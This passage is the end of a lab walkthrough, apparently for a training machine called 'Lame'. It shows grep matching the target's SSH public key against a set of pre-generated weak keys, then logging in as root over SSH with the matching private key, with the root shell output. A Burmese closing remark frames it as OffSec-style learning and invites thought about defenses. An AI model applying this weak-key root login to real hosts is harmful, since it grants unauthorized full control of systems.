grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w==
57c3115d77c56390332dc5c49978627a-5429.pub # <--- MATCHING PUBKEY


#################################################################################


# now ssh into the target machine with the matching private key as root
ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.10.3
The authenticity of host '10.10.10.3 (10.10.10.3)' can't be established.
DSA key fingerprint is SHA256:kgTW5p1Amzh5MfHn9jIpZf2/pCIZq2TNrG9sh+fy95Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.3' (DSA) to the list of known hosts.

Last login: Mon Nov  6 17:01:18 2023 from :0.0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@lame:~# 
```

ကဲ... ဒီလောက်ဆိုရင်တော့... OffSec ရဲ့ အရသာကို အနည်းငယ် ရိပ်စားမိမယ်လို့ မျှော်လင့်ရပါတယ်။ Attack factor ရဲ့ သဘောသဘာဝ နားလည်ပြီးတော့၊ ဘယ်လိုမျိုးကာကွယ်နိုင်သလဲဆိုတာကို စာရေးသူတို့ တွေးကြည့်မိနိုင်လောက်ပါပြီ။
